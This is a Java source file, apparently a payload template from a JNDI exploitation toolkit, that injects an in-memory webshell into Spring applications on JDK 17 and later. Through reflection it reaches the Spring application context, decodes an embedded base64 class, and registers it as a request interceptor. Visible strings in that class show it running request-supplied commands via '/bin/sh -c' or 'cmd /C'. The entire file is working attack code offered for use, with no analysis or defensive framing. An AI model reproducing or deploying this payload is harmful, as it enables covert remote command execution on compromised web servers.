package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.LinkedHashSet;

// for JDK 17 and above

// when using SpringMemshellTemplate2,
// java.lang.reflect.InaccessibleObjectException:
// Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(byte[],int,int) throws java.lang.ClassFormatError accessible:
// module java.base does not "opens java.lang" to unnamed module @c730b35
public class SpringMemshellTemplate0 extends AbstractTranslet {

    public SpringMemshellTemplate0(){
        // for JDK 17 and above
        System.out.println("[+] Add Dynamic Interceptor0");

        try{
            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
            java.lang.reflect.Field field = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            // 2. 属性被 private 修饰，所以 setAccessible true
            System.out.println("field.setAccessible(true);");
            field.setAccessible(true);
            // 3. 获取一个 ApplicationContext 实例
            WebApplicationContext context =(WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();

            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            try{
                System.out.println("classLoader.loadClass(\"org.joychou.controller.DynamicInterceptorTemplate0\");");
                clazz = classLoader.loadClass("org.joychou.controller.DynamicInterceptorTemplate0");
            }catch(ClassNotFoundException e){
                try{
                    String codeClass = "yv66vgAAADsA9QoAAgADBwAEDAAFAAYBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEABjxpbml0PgEAAygpVggACAEABHBhc3MJAAoACwcADAwADQAOAQAyb3JnL2pveWNob3UvY29udHJvbGxlci9EeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZTABABBiYXNpY0NtZFNoZWxsUHdkAQASTGphdmEvbGFuZy9TdHJpbmc7CgAKABAMABEABgEACmluaXRpYWxpemUJABMAFAcAFQwAFgAXAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwgAGQEAI1srXSBEeW5hbWljIEludGVyY2VwdG9yMCBzYXlzIGhlbGxvCgAbABwHAB0MAB4AHwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCAAhAQAEdHlwZQsAIwAkBwAlDAAmACcBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACkBAAViYXNpYwoAKwAsBwAtDAAuAC8BABBqYXZhL2xhbmcvU3RyaW5nAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaCgArADEMADIAMwEAB2lzRW1wdHkBAAMoKVoJADUANgcANwwAOAAOAQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yCAA6AQABLwgAPAEABy9iaW4vc2gIAD4BAAItYwgAQAEAA2NtZAgAQgEAAi9DBwBEAQARamF2YS91dGlsL1NjYW5uZXIKAEYARwcASAwASQBKAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBGAEwMAE0ATgEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBQAFEHAFIMAFMAVAEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwoAQwBWDAAFAFcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAFkBAAJcQQoAQwBbDABcAF0BAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAEMAXwwAYABhAQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CwBjAGQHAGUMAGYAZwEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsKAGkAHAcAagEAE2phdmEvaW8vUHJpbnRXcml0ZXIKAGwAbQcAbgwAbwBwAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwoAbAByDABzAHQBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7CAB2AQAkb3JnLmpveWNob3UuY29udHJvbGxlci5NeUNsYXNzTG9hZGVyCgB4AHkHAHoMAHsAfAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsJAAoAfgwAfwCAAQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsHAIIBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbggAhAEJMHl2NjZ2Z0FBQURzQVdnb0FBZ0FEQndBRURBQUZBQVlCQUJWcVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSUJBQVk4YVc1cGRENEJBQm9vVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc3BWZ2NBQ0FFQUpHOXlaeTlxYjNsamFHOTFMMk52Ym5SeWIyeHNaWEl2VFhsRGJHRnpjMHh2WVdSbGNnb0FCd0FEQ2dBSEFBc01BQXdBRFFFQUMyUmxabWx1WlVOc1lYTnpBUUFYS0Z0Q1NVa3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0lBQThCQUU1RE9seHlaWEJ2YzF4S1RrUkpSWGh3Ykc5cGRGeDBZWEpuWlhSY1kyeGhjM05sYzF4dmNtZGNhbTk1WTJodmRWeGpiMjUwY205c2JHVnlYRTE1UTJ4aGMzTk1iMkZrWlhJdVkyeGhjM01IQUJFQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkNnQVRBQlFIQUJVTUFCWUFGd0VBRTJwaGRtRXZibWx2TDJacGJHVXZVR0YwYUhNQkFBTm5aWFFCQURzb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1cweHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5dWFXOHZabWxzWlM5UVlYUm9Pd29BR1FBYUJ3QWJEQUFjQUIwQkFCTnFZWFpoTDI1cGJ5OW1hV3hsTDBacGJHVnpBUUFNY21WaFpFRnNiRUo1ZEdWekFRQVlLRXhxWVhaaEwyNXBieTltYVd4bEwxQmhkR2c3S1Z0Q0J3QWZBUUFkYW1GMllTOXBieTlHYVd4bFRtOTBSbTkxYm1SRmVHTmxjSFJwYjI0SEFDRUJBQnBxWVhaaEwyeGhibWN2VW5WdWRHbHRaVVY0WTJWd2RHbHZiZ29BSUFBakRBQUZBQ1FCQUJnb1RHcGhkbUV2YkdGdVp5OVVhSEp2ZDJGaWJHVTdLVllIQUNZQkFCTnFZWFpoTDJsdkwwbFBSWGhqWlhCMGFXOXVDZ0FvQUNrSEFDb01BQ3NBTEFFQUVHcGhkbUV2ZFhScGJDOUNZWE5sTmpRQkFBcG5aWFJGYm1OdlpHVnlBUUFjS0NsTWFtRjJZUzkxZEdsc0wwSmhjMlUyTkNSRmJtTnZaR1Z5T3dvQUxnQXZCd0F3REFBeEFESUJBQmhxWVhaaEwzVjBhV3d2UW1GelpUWTBKRVZ1WTI5a1pYSUJBQTVsYm1OdlpHVlViMU4wY21sdVp3RUFGaWhiUWlsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzSkFEUUFOUWNBTmd3QU53QTRBUUFRYW1GMllTOXNZVzVuTDFONWMzUmxiUUVBQTI5MWRBRUFGVXhxWVhaaEwybHZMMUJ5YVc1MFUzUnlaV0Z0T3dvQU9nQTdCd0E4REFBOUFENEJBQk5xWVhaaEwybHZMMUJ5YVc1MFUzUnlaV0Z0QVFBSGNISnBiblJzYmdFQUZTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUFtVEc5eVp5OXFiM2xqYUc5MUwyTnZiblJ5YjJ4c1pYSXZUWGxEYkdGemMweHZZV1JsY2pzQkFBRmpBUUFYVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQ3dvVzBKTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxNYW1GMllTOXNZVzVuTDBOc1lYTnpPd0VBQldKNWRHVnpBUUFDVzBJQkFBdGpiR0Z6YzB4dllXUmxjZ0VBQkcxaGFXNEJBQllvVzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsV0FRQU1ZMnhoYzNORGIyNTBaVzUwQVFBQlpRRUFIMHhxWVhaaEwybHZMMFpwYkdWT2IzUkdiM1Z1WkVWNFkyVndkR2x2YmpzQkFCVk1hbUYyWVM5cGJ5OUpUMFY0WTJWd2RHbHZianNCQUFSaGNtZHpBUUFUVzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUVtSmhjMlUyTkVOc1lYTnpRMjl1ZEdWdWRBRUFFa3hxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBRFZOMFlXTnJUV0Z3VkdGaWJHVUhBRWdCQUFwVGIzVnlZMlZHYVd4bEFRQVNUWGxEYkdGemMweHZZV1JsY2k1cVlYWmhBUUFNU1c1dVpYSkRiR0Z6YzJWekFRQUhSVzVqYjJSbGNnQWhBQWNBQWdBQUFBQUFBd0FBQUFVQUJnQUJBRDhBQUFBNkFBSUFBZ0FBQUFZcUs3Y0FBYkVBQUFBQ0FFQUFBQUFHQUFFQUFBQUpBRUVBQUFBV0FBSUFBQUFHQUVJQVF3QUFBQUFBQmdCRUFFVUFBUUFKQUF3QVJnQUJBRDhBQUFCRUFBUUFBZ0FBQUJDN0FBZFpLN2NBQ1NvREtyNjJBQXF3QUFBQUFnQkFBQUFBQmdBQkFBQUFEUUJCQUFBQUZnQUNBQUFBRUFCSEFFZ0FBQUFBQUJBQVNRQkZBQUVBQ1FCS0FFc0FBUUEvQUFBQTFnQURBQU1BQUFBMEVnNER2UUFRdUFBU3VBQVlUS2NBRjAyN0FDQlpMTGNBSXI5TnV3QWdXU3kzQUNLL3VBQW5LN1lBTFUyeUFETXN0Z0E1c1FBQ0FBQUFEUUFRQUI0QUFBQU5BQm9BSlFBREFFQUFBQUFtQUFrQUFBQVRBQTBBR0FBUUFCUUFFUUFWQUJvQUZnQWJBQmNBSkFBYUFDd0FHd0F6QUJ3QVFRQUFBRDRBQmdBTkFBTUFUQUJJQUFFQUVRQUpBRTBBVGdBQ0FCc0FDUUJOQUU4QUFnQUFBRFFBVUFCUkFBQUFKQUFRQUV3QVNBQUJBQ3dBQ0FCU0FGTUFBZ0JVQUFBQUVBQURVQWNBSGtrSEFDWDhBQWtIQUZVQUFnQldBQUFBQWdCWEFGZ0FBQUFLQUFFQUxnQW9BRmtBQ1E9PQoAhgCHBwCIDACJAIoBABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RGVjb2RlcgEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsKAIwAjQcAjgwAjwCQAQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyAQAGZGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQggAkgEAXFsqXSBEeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZTA6IGphdmEubGFuZy5pbnZva2UuTWV0aG9kSGFuZGxlcy5sb29rdXAoKS5kZWZpbmVDbGFzcyhieXRlcyk7CgCUAJUHAJYMAJcAmAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwEABmxvb2t1cAEAKSgpTGphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXA7CgCaAJsHAJwMAJ0AngEAJWphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXABAAtkZWZpbmVDbGFzcwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwcAoAEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uCgCfAKIMAKMABgEAD3ByaW50U3RhY2tUcmFjZQgApQEAXEM6XHJlcG9zXEpORElFeHBsb2l0XHRhcmdldFxjbGFzc2VzXG9yZ1xqb3ljaG91XGNvbnRyb2xsZXJcRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUwLmNsYXNzCgCnAKgHAKkMAKoAqwEAE2phdmEvbmlvL2ZpbGUvUGF0aHMBAANnZXQBADsoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vZmlsZS9QYXRoOwoArQCuBwCvDACwALEBABNqYXZhL25pby9maWxlL0ZpbGVzAQAMcmVhZEFsbEJ5dGVzAQAYKExqYXZhL25pby9maWxlL1BhdGg7KVtCBwCzAQAdamF2YS9pby9GaWxlTm90Rm91bmRFeGNlcHRpb24HALUBABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgoAtAC3DAAFALgBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYHALoBABNqYXZhL2lvL0lPRXhjZXB0aW9uCgCGALwMAL0AvgEACmdldEVuY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7CgDAAMEHAMIMAMMAxAEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA0TG9yZy9qb3ljaG91L2NvbnRyb2xsZXIvRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUwOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAWsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADVN0YWNrTWFwVGFi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";
                    byte[] bytes = java.util.Base64.getDecoder().decode(codeClass);

//                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                    method.setAccessible(true);
//                    clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
                    System.out.println("java.lang.invoke.MethodHandles.lookup().defineClass(bytes);");
                    MethodHandles.Lookup lookup = java.lang.invoke.MethodHandles.lookup();
                    Method method = MethodHandles.Lookup.class.getMethod("defineClass", byte[].class);
                    clazz = (Class) method.invoke(lookup, bytes);
                }catch (Exception ex){
                    ex.printStackTrace();
                }
            }

            adaptedInterceptors.add(clazz.newInstance());
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
